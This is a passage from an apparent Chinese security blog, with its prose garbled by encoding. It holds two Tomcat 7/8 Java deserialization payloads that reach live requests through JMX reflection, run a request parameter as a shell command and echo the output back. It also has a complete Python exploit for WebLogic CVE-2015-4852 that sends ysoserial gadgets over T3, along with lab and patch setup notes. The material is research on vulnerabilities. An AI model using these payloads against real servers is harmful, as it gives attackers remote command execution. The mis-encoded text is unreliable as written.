<p>é€šè¿‡ideaçš„è®¡ç®—åŠŸèƒ½æˆ‘ä»¬å¯ä»¥ç¬¦åˆç›´è§‰çš„æ‹¿åˆ°responseï¼Œå®é™…æƒ³è·å–è¿˜æ˜¯éœ€è¦å„ç§åå°„çš„ã€‚tomcat7,8è·å–è¿™æ¡é“¾çš„æ–¹å¼å¤§åŒå°å¼‚ï¼Œå˜åŒ–ä¹‹å¤„åœ¨äº<code>name=&quot;http-bio-8888&quot;,type=GlobalRequestProcessor</code>ï¼Œå…¶ä¸­8888æ˜¯tomcatæœåŠ¡ç«¯ç«¯å£ï¼Œåœ¨tomcat8é‡Œé¢bioå˜ä¸ºnioã€‚å…³äº<a href="https://blog.csdn.net/ClementAD/article/details/47045673">bioï¼Œnioçš„ç»†èŠ‚å¯ä»¥å‚è€ƒè¿™ç¯‡æ–‡ç« </a>ã€‚</p>
<p>é™¤æ­¤ä¹‹å¤–åœ¨å®é™…åœºæ™¯ä¸‹ä¼šæœ‰å¾ˆå¤šrequestsæ˜¯è¦éå†processorsä¸­çš„å„ä¸ªrequestsã€‚</p>
<h2 id="demoä»£ç "><a href="#demoä»£ç " class="headerlink" title="demoä»£ç "></a>demoä»£ç </h2><p>tomcat8çš„demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat82</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat82</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-nio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>tomcat7çš„demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.buf.ByteChunk;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.modeler.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.MBeanServer;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">tomcat72</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">tomcat72</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            MBeanServer mbeanServer = Registry.getRegistry((Object)<span class="keyword">null</span>, (Object)<span class="keyword">null</span>).getMBeanServer();</span><br><span class="line">            Field field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.JmxMBeanServer"</span>).getDeclaredField(<span class="string">"mbsInterceptor"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Object obj = field.get(mbeanServer);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.interceptor.DefaultMBeanServerInterceptor"</span>).getDeclaredField(<span class="string">"repository"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.Repository"</span>).getDeclaredField(<span class="string">"domainTb"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            HashMap obj2 = (HashMap)field.get(obj);</span><br><span class="line">            obj = ((HashMap)obj2.get(<span class="string">"Catalina"</span>)).get(<span class="string">"name=\"http-bio-8888\",type=GlobalRequestProcessor"</span>);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"com.sun.jmx.mbeanserver.NamedObject"</span>).getDeclaredField(<span class="string">"object"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.tomcat.util.modeler.BaseModelMBean"</span>).getDeclaredField(<span class="string">"resource"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            obj = field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestGroupInfo"</span>).getDeclaredField(<span class="string">"processors"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            ArrayList obj3 = (ArrayList)field.get(obj);</span><br><span class="line"></span><br><span class="line">            field = Class.forName(<span class="string">"org.apache.coyote.RequestInfo"</span>).getDeclaredField(<span class="string">"req"</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">boolean</span> isLinux = <span class="keyword">true</span>;</span><br><span class="line">            String osTyp = System.getProperty(<span class="string">"os.name"</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="keyword">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">"win"</span>)) &#123;</span><br><span class="line">                isLinux = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; obj3.size(); i++) &#123;</span><br><span class="line">                Request obj4 = (Request) field.get(obj3.get(i));</span><br><span class="line">                String username = obj4.getParameters().getParameter(<span class="string">"username"</span>);</span><br><span class="line">                <span class="keyword">if</span>(username != <span class="keyword">null</span>)&#123;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> String[]&#123;<span class="string">"sh"</span>, <span class="string">"-c"</span>, username&#125; : <span class="keyword">new</span> String[]&#123;<span class="string">"cmd.exe"</span>, <span class="string">"/c"</span>,  username&#125;;</span><br><span class="line">                    InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    Scanner s = <span class="keyword">new</span> Scanner(in).useDelimiter(<span class="string">"\\a"</span>);</span><br><span class="line">                    String output = <span class="string">""</span>;</span><br><span class="line">                    <span class="keyword">while</span> (s.hasNext())&#123;</span><br><span class="line">                        output += s.next();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">byte</span>[] buf = output.getBytes();</span><br><span class="line">                    ByteChunk bc = <span class="keyword">new</span> ByteChunk();</span><br><span class="line">                    bc.setBytes(buf, <span class="number">0</span>, buf.length);</span><br><span class="line">                    obj4.getResponse().doWrite(bc);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="comment">//            System.out.println("=======================");</span></span><br><span class="line"><span class="comment">//            System.out.println(e);</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>




<p>å¦å¤–å¦‚æœæœ‰å¸ˆå‚…åœ¨å¤ç°çš„æ—¶å€™å‘ç°headerè¶…é•¿ï¼Œå¯ä»¥å‚è€ƒ<a href="https://xz.aliyun.com/t/6227">ç¼©å°ysoserial payloadä½“ç§¯çš„å‡ ä¸ªæ–¹æ³•</a>ã€‚ï¼ˆä¹Ÿå¯ä»¥å‚è€ƒé•¿äº­å¸ˆå‚…ç»™çš„ä¿®æ”¹headerå¤´çš„æ€è·¯ï¼Œå®é™…å¼„èµ°çš„æ—¶å€™ä¹Ÿè®¸ä¼šé‡åˆ°ä¸€äº›å‘ï¼‰</p>
<p>tomcat7+simple-shiro-webæˆåŠŸå¤ç°<br><img src="1585898629028-36d3e3fb-588d-4acd-8b68-a32c49da90a7.png#align=left&display=inline&height=541&name=image.png&originHeight=1082&originWidth=2568&size=511446&status=done&style=none&width=1284" alt="image.png"></p>
<h2 id="æœ€å"><a href="#æœ€å" class="headerlink" title="æœ€å"></a>æœ€å</h2><p>æ„Ÿè°¢å¤§å¸ˆå‚…ä»¬å¼€æºçš„è‡ªå·±çš„æ€è·¯ï¼Œå­¦åˆ°å¾ˆå¤šã€‚å…¶æ¬¡åœ¨ç ”ç©¶è¿™ç§æ–¹æ³•çš„æ—¶å€™å‘ç°è¿˜æœ‰å…¶ä»–å¾ˆå¤šMBeanï¼Œä¹Ÿè®¸è¿˜æœ‰å¾ˆå¤šå¥½ç©çš„ä¸œè¥¿ï¼Ÿ</p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>weblogicå†å²T3ååºåˆ—åŒ–æ¼æ´åŠè¡¥ä¸æ¢³ç†</title>
    <url>/2020/03/25/weblogic%E5%8E%86%E5%8F%B2T3%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E8%A1%A5%E4%B8%81%E6%A2%B3%E7%90%86/</url>
    <content><![CDATA[<!-- å¦‚é¢˜ -->
<!-- more -->

<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p>ä½¿ç”¨ateamå¤§å“¥å¼€æºçš„è°ƒè¯•ç¯å¢ƒ<a href="https://github.com/QAX-A-Team/WeblogicEnvironment">Weblogicç¯å¢ƒæ­å»ºå·¥å…·</a></p>
<h3 id="æ¼æ´ç¯å¢ƒæ­å»º"><a href="#æ¼æ´ç¯å¢ƒæ­å»º" class="headerlink" title="æ¼æ´ç¯å¢ƒæ­å»º"></a>æ¼æ´ç¯å¢ƒæ­å»º</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker build --build-arg JDK_PKG=jdk-7u21-linux-x64.tar.gz --build-arg WEBLOGIC_JAR=wls1036_generic.jar  -t weblogic1036jdk7u21 .</span><br><span class="line">docker run -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21</span><br></pre></td></tr></table></figure>


<h3 id="è°ƒè¯•ç¯å¢ƒæ­å»º"><a href="#è°ƒè¯•ç¯å¢ƒæ­å»º" class="headerlink" title="è°ƒè¯•ç¯å¢ƒæ­å»º"></a>è°ƒè¯•ç¯å¢ƒæ­å»º</h3><p>å°†weblogicä¾èµ–çš„jaråŒ…æ‹·è´å‡ºæ¥å¹¶å¯¼å…¥ideaã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mkdir wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/modules ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/wlserver/server/lib ./wlserver1036</span><br><span class="line">docker cp weblogic1036jdk7u21:/u01/app/oracle/middleware/coherence_3.7/lib ./coherence_3.7/lib</span><br></pre></td></tr></table></figure>


<p><img src="1584628921983-32316897-d553-44d1-96f7-dac78f09b6b7.png" alt="image.png"></p>
<p>è¿œç¨‹è°ƒè¯•é…ç½®<br><img src="1584628994284-2bcf4d7e-e223-411e-ad60-c66f5bea1520.png" alt="image.png"></p>
<h2 id="T3-åè®®è¯´æ˜"><a href="#T3-åè®®è¯´æ˜" class="headerlink" title="T3 åè®®è¯´æ˜"></a>T3 åè®®è¯´æ˜</h2><p>t3æ˜¯oracleå¯¹rmiçš„å¢å¼ºï¼Œå’Œrmiä¸€æ ·åœ¨ç½‘ç»œé—´ä¼ è¾“æ—¶æ•°æ®æ˜¯åºåˆ—åŒ–è¿‡çš„ã€‚æ–‡ç« çš„é‡ç‚¹åœ¨äºåˆ†ææ¼æ´ä»¥åŠè¡¥ä¸ä¸ºä»€ä¹ˆå¯ä»¥ç»•è¿‡ï¼Œå°±ä¸åˆ†æt3åè®®æ•°æ®çš„æ ¼å¼äº†ï¼Œåœ¨å¤ç°æ—¶æˆ‘ä»¬åªéœ€è¦å°†ç”Ÿæˆçš„æ¶æ„åºåˆ—åŒ–æ•°æ®å¥—åœ¨pyæ¨¡ç‰ˆä¸­å³å¯ã€‚å¦‚æœæœ‰å¸ˆå‚…æƒ³å¯¹weblogicä½“ç³»åŠå…¶t3åè®®çš„æ­£å¸¸ä½¿ç”¨æ„Ÿå…´è¶£æ¨èé˜…è¯»<a href="https://mp.weixin.qq.com/s?__biz=MzU5NDgxODU1MQ==&mid=2247485058&idx=1&sn=d22b310acf703a32d938a7087c8e8704">WebLogicå®‰å…¨ç ”ç©¶æŠ¥å‘Š</a>ã€‚</p>
<h2 id="CVE-2015-4852"><a href="#CVE-2015-4852" class="headerlink" title="CVE-2015-4852"></a>CVE-2015-4852</h2><p>t3åè®®çš„ä¼ è¾“è¿‡æ¥çš„æ•°æ®ä¼šåœ¨weblogic.rjvm.InboundMsgAbbrev#readObjectä¸­è¯»å–å¹¶è¿›è¡Œååºåˆ—åŒ–ã€‚<br><img src="1584601233181-753caf13-53d7-4aac-8418-72313cad68bc.png" alt="image.png"><br>å› ä¸ºæ˜¯t3ç¬¬ä¸€æ´æ‰€ä»¥å¯ä»¥çœ‹åˆ°ServerChannelInputStreamçš„resolveClasså¹¶æ²¡æœ‰ä»»ä½•åšé˜²å¾¡ã€‚<img src="1584601257106-fcbcd3bf-a03a-475c-b81e-b9a076e86ab2.png" alt="image.png"><br>è‡ªå¸¦ccé“¾<br><img src="1584628722500-b9b2433c-a6e7-47a8-ad72-91ff7179875c.png" alt="image.png"></p>
<p>æ‰€ä»¥åªéœ€è¦æŠŠysoserialçš„ç”Ÿæˆçš„payloadåµŒå…¥t3åè®®å³å¯ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload1</span><span class="params">(gadget, command)</span>:</span></span><br><span class="line">    JAR_FILE = <span class="string">'/Users/cengsiqi/Desktop/javasectools/ysoserial/target/ysoserial-0.0.6-SNAPSHOT-all.jar'</span></span><br><span class="line">    popen = subprocess.Popen([<span class="string">'java'</span>, <span class="string">'-jar'</span>, JAR_FILE, gadget, command], stdout=subprocess.PIPE)</span><br><span class="line">    <span class="keyword">return</span> popen.stdout.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_payload2</span><span class="params">(path)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(path, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(host, port, payload)</span>:</span></span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.connect((host, port))</span><br><span class="line"></span><br><span class="line">    handshake = <span class="string">"t3 12.2.3\nAS:255\nHL:19\nMS:10000000\n\n"</span>.encode()</span><br><span class="line">    sock.sendall(handshake)</span><br><span class="line">    data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">    pattern = re.compile(<span class="string">r"HELO:(.*).false"</span>)</span><br><span class="line">    version = re.findall(pattern, data.decode())</span><br><span class="line">    <span class="keyword">if</span> len(version) == <span class="number">0</span>:</span><br><span class="line">        print(<span class="string">"Not Weblogic"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    print(<span class="string">"Weblogic &#123;&#125;"</span>.format(version[<span class="number">0</span>]))</span><br><span class="line">    data_len = binascii.a2b_hex(<span class="string">b"00000000"</span>) <span class="comment">#æ•°æ®åŒ…é•¿åº¦ï¼Œå…ˆå ä½ï¼Œåé¢ä¼šæ ¹æ®å®é™…æƒ…å†µé‡æ–°</span></span><br><span class="line">    t3header = binascii.a2b_hex(<span class="string">b"016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006"</span>) <span class="comment">#t3åè®®å¤´</span></span><br><span class="line">    flag = binascii.a2b_hex(<span class="string">b"fe010000"</span>) <span class="comment">#ååºåˆ—åŒ–æ•°æ®æ ‡å¿—</span></span><br><span class="line">    payload = data_len + t3header + flag + payload</span><br><span class="line">    payload = struct.pack(<span class="string">'&gt;I'</span>, len(payload)) + payload[<span class="number">4</span>:] <span class="comment">#é‡æ–°è®¡ç®—æ•°æ®åŒ…é•¿åº¦</span></span><br><span class="line">    sock.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    host = <span class="string">"127.0.0.1"</span></span><br><span class="line">    port = <span class="number">7001</span></span><br><span class="line">    gadget = <span class="string">"CommonsCollections1"</span> <span class="comment">#CommonsCollections1 Jdk7u21</span></span><br><span class="line">    command = <span class="string">"touch /tmp/CVE-2015-4852"</span></span><br><span class="line"></span><br><span class="line">    payload = get_payload1(gadget, command)</span><br><span class="line">    exp(host, port, payload)</span><br></pre></td></tr></table></figure>


<h2 id="CVE-2015-4852çš„ä¿®å¤"><a href="#CVE-2015-4852çš„ä¿®å¤" class="headerlink" title="CVE-2015-4852çš„ä¿®å¤"></a>CVE-2015-4852çš„ä¿®å¤</h2><p>è¡¥ä¸ï¼š2016å¹´1æœˆ p21984589_1036_Generic<br>ä¿®å¤æ–¹æ³•æ˜¯åœ¨resolveClassä¸­å¼•å…¥äº† ClassFilter.isBlackListedè¿›è¡Œè¿‡æ»¤ï¼Œè·Ÿè¿›weblogic.rmi.ClassFilterå¯ä»¥çœ‹åˆ°é»‘åå•å†…å®¹ã€‚<br><img src="1584603275786-9f17f890-175d-49f5-95da-7eeaa1fcc48e.png" alt="image.png"></p>
<p><img src="1584933120054-b1f0b1cc-f9a7-4e35-a591-27af88d29ab2.png" alt="image.png"></p>
<p>é™¤æ­¤ä¹‹å¤–ï¼Œå¦å¤–å‡ ä¸ªååºåˆ—åŒ–ç‚¹ä¹Ÿè¢«åŠ äº†ç›¸åŒçš„è¿‡æ»¤ï¼ˆä¸ä¸€ä¸€æ‰“å¼€çœ‹äº†ï¼‰ã€‚<br><img src="1584629682488-1765cfe9-738d-46a7-8dcf-5341c7ac5c6f.png" alt="image.png"></p>
<p><strong>ååºåˆ—åŒ–ä¸¤ä¸ªå…³é”®ç‚¹ï¼Œä¸€ä¸ªæ˜¯è§¦å‘ååºåˆ—åŒ–çš„ç‚¹ï¼ŒäºŒæ˜¯gadgetã€‚ç°åœ¨ååºåˆ—åŒ–è§¦å‘ç‚¹æœ‰äº†ï¼Œåé¢çš„t3çš„cveå°±æ˜¯ç»•é»‘åå•çš„å„ç§æŠ€å·§äº†ã€‚</strong></p>
<p>ä¸ºäº†è®©åé¢çš„åˆ†ææ›´å…·æœ‰è¯´æœåŠ›ï¼Œè¿™é‡Œä»¥10.3.6ä¸ºä¾‹è¯´æ˜å¦‚ä½•æ‰“è¡¥ä¸ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -it  -d -p 7001:7001 -p 8453:8453 -p 5556:5556 --name weblogic1036jdk7u21 weblogic1036jdk7u21 /bin/bash</span><br><span class="line">docker cp /Users/cengsiqi/Downloads/p21984589_1036_Generic weblogic1036jdk7u21:/p21984589_1036_Generic</span><br><span class="line">docker <span class="built_in">exec</span> -it weblogic1036jdk7u21 /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /p21984589_1036_Generic</span><br><span class="line">mv patch-catalog_23510.xml  patch-catalog.xml</span><br><span class="line"><span class="built_in">cd</span> /u01/app/oracle/middleware/utils/bsu</span><br><span class="line">./bsu.sh -install -patch_download_dir=/p21984589_1036_Generic -patchlist=S8C2 -prod_dir=/u01/app/oracle/middleware/wlserver/</span><br><span class="line">/u01/app/oracle/Domains/ExampleSilentWTDomain/bin/startWebLogic.sh</span><br></pre></td></tr></table></figure>


<p>å¦‚æœæ‰“è¡¥ä¸æ—¶å‡ºç°å¦‚ä¸‹é”™è¯¯éœ€è¦è‡ªè¡ŒæŠŠbsu.shä¸­çš„å†…å­˜å‚æ•°MEM_ARGSè°ƒå¤§ä¸€ç‚¹ã€‚<br><img src="1584631227480-e3ca11bc-0c53-475e-9cd7-84828bef3c5f.png" alt="image.png"><br>æˆåŠŸåæˆªå›¾å¦‚ä¸‹<br><img src="1584631564760-944c5d18-1fa7-432a-b0bb-48b1a83e1379.png" alt="image.png"><br>è¿™æ—¶å†å°è¯•æ‰“ä¼šå‡ºç°Unauthorized<br><img src="1584632143015-10d8cd9f-88ab-41dc-807d-14af2ab6ef9b.png" alt="image.png"></p>
<h2 id="CVE-2016-0638"><a href="#CVE-2016-0638" class="headerlink" title="CVE-2016-0638"></a>CVE-2016-0638</h2><p>weblogic.jms.common.StreamMessageImplæ²¡åœ¨é»‘åå•ï¼Œåœ¨å…¶ååºåˆ—åŒ–æ—¶ä¼šè¯»å–ä¸€æ®µæ•°æ®å¹¶è¿›è¡Œååºåˆ—åŒ–ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠè¿™æ®µæ•°æ®ä¼ªé€ æˆrce payloadã€‚<br><img src="1584605337636-f9686a30-b0ee-4463-ac50-c0aa1727c272.png" alt="image.png"></p>
